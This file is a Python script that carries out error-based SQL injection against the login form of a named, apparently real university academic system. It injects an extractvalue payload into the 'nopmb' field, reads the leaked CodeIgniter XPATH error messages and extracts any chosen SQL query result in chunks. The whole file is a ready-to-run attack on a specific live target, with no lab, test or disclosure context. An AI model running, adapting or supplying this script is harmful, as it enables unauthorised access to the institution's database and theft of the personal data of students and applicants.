#!/usr/bin/env python3
"""Error-based SQLi extractor for siak.husadagemilang.ac.id (CI db_debug leak).
Usage: python3 sqli_siak.py "SELECT version()"
"""
import sys, re, html, urllib3, requests

urllib3.disable_warnings()
URL = "https://siak.husadagemilang.ac.id/index.php/web/content/pendaftaran"
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131 Safari/537.36"}

def q(sql, timeout=25):
    payload = "zz' AND extractvalue(1,concat(0x7e,(" + sql + ")))-- -"
    r = requests.post(URL, data={"nopmb": payload, "password": "x"}, headers=UA,
                      timeout=timeout, verify=False)
    body = r.text or ""
    # CI prints: <p>Error Number: 1105 ... <p>XPATH syntax error: '~VALUE'
    m = re.search(r"XPATH syntax error:\s*'~([^']*)'", html.unescape(body))
    if m:
        return m.group(1)
    m2 = re.search(r"Error Message:\s*</p><p>(.*?)</p>", body, re.S)
    if m2:
        return "ERR:" + re.sub(r"<[^>]+>", "", m2.group(1))[:200]
    if r.status_code == 200:
        return "NORESULT"
    return f"HTTP{r.status_code}"

def extract(sql, maxlen=64):
    # substring-based, chunked to avoid truncation of extractvalue (32 chars)
    out = ""
    while len(out) < maxlen:
        part = q(f"SELECT SUBSTRING(({sql}),{len(out)+1},30)")
        if not part or part in ("NORESULT",) or part.startswith("HTTP") or part.startswith("ERR:"):
            break
        if part == "":
            break
        out += part
        if len(part) < 30:
            break
    return out

if __name__ == "__main__":
    sql = sys.argv[1]
    if len(sys.argv) > 2 and sys.argv[2] == "--raw":
        print(q(sql))
    else:
        print(extract(sql, int(sys.argv[2]) if len(sys.argv) > 2 else 64))
